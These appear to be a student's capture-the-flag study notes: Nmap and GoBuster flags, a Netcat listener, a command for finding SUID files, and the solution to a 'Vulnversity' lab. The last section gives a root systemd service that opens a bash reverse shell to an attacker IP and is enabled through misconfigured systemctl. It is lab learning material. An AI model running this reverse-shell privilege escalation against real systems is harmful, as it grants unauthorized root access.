# Nmap
* Used to discover hosts and services on a computer network

## Flags

### Useful
* `-sV`: Attempts to determine the version of the services running ("scan Version")
* `-p <x>` or `-p-`: Port scan for port(s) <x> or scan all ports
* `-Pn`: Disable host discovery and just scan for open ports
* `-A`: Enables OS and version detection, executes in-build scripts for further enumerations (i.e. "All")
* `-sC`: Scan with the default nmap scripts
* `-v`: Verbose mode
* `-sU`: UDP port scan
* `-sS`: TCP SYN port scan
* `-O`: Probe for operating system information

### Other
* `-n`: No DNS resolution

# GoBuster
* GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains, and virtual host names.
* Not natively installed on kali.
* Requires a wordlist

## Flags

### Useful
* `-e`: Print the full URLs in the console
* `-u`: The target URL (ex: `-u http://10.11.12.13:3333`
* `-w`: Path to the wordlist (ex `-w /usr/share/wordlists/rockyou.txt`)
* `-U` `-P`: Username and Password for Basic Auth
* `-p <x>`: Proxy to use for requests
* `-c <http cookies>`: Specify a cookie for simulating your auth

# Burp Suite
* Used burp suite to capture the post request and try many different file extensions to see which one was accepted

# Netcat
* To start a listening server: `nc -lvnp <port>`

# SUID
* SUID (set owner userId upon execution) is a permissions flag that is set by certain programs. The flag gives temporary permissions to a user to run the program.file with the permissions of the file owner
	* A food example of this is `passwd`, which needs to update the shadows file with root access
* To find files with the SUID permission: `find . -perm /4000 -print 2>/dev/null`

# Vulnversity challenge
* Required the following to find the flag:

* On Host:
```
nc -lvp 9999
```

* On remote:
```
echo '[Unit]
Description=runroot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.2.18.161/9999 0>&1"

[Install]
WantedBy=multi-user.target' > /tmp/root.service

/bin/systemctl enable /tmp/root.service
/bin/systemctl start root
```

* Tutorial: https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
